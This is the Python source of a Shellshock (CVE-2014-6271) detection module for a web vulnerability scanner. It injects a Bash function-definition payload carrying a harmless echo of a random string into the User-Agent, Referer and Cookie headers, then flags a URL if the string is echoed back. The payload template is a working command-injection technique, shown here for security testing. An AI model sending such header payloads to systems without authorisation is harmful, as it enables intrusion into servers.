# Module Description:
# This module detects Shellshock vulnerabilities (CVE-2014-6271 and related CVEs)
# in web applications using vulnerable versions of the Bash shell. Shellshock allows
# attackers to execute arbitrary commands by injecting malicious code into environment
# variables processed by Bash, particularly through CGI scripts. This can lead to
# complete server compromise.
import random
import string
from binascii import hexlify
from typing import Optional

from httpx import RequestError

from PentoraCore.attack.attack import Attack
from PentoraCore.net import Request, Response
from PentoraCore.definitions.exec import CommandExecutionFinding
from PentoraCore.main.log import log_red


class ModuleShellshock(Attack):
    """
    Detects scripts vulnerable to the infamous ShellShock vulnerability.
    """

    name = "shellshock"

    do_get = True
    do_post = True

    def __init__(self, crawler, persister, attack_options, crawler_configuration):
        Attack.__init__(self, crawler, persister, attack_options, crawler_configuration)
        empty_func = "() { :;}; "

        self.rand_string = "".join([random.choice(string.hexdigits) for _ in range(32)])
        hex_string = hexlify(self.rand_string.encode())
        bash_string = ""
        for i in range(0, 64, 2):
            bash_string += "\\x" + hex_string[i:i + 2].decode()

        cmd = f"echo; echo; echo -e '{bash_string}';"

        self.hdrs = {
            "user-agent": empty_func + cmd,
            "referer": empty_func + cmd,
            "cookie": empty_func + cmd
        }

    async def must_attack(self, request: Request, response: Optional[Response] = None):
        if response.is_directory_redirection:
            return False

        # We attempt to attach each script once whatever the method
        return request.path not in self.attacked_get

    async def attack(self, request: Request, response: Optional[Response] = None):
        url = request.path
        self.attacked_get.append(url)

        # We can't see anything by printing requests because payload is in headers so let's print nothing :)
        evil_req = Request(url)

        try:
            response = await self.crawler.async_send(evil_req, headers=self.hdrs)
        except RequestError:
            self.network_errors += 1
            return

        if response:
            data = response.content
            if self.rand_string in data:
                log_red(f"URL {url} seems vulnerable to Shellshock attack!")

                await self.add_high(
                    request_id=request.path_id,
                    finding_class=CommandExecutionFinding,
                    request=evil_req,
                    info=f"URL {url} seems vulnerable to Shellshock attack",
                    response=response
                )
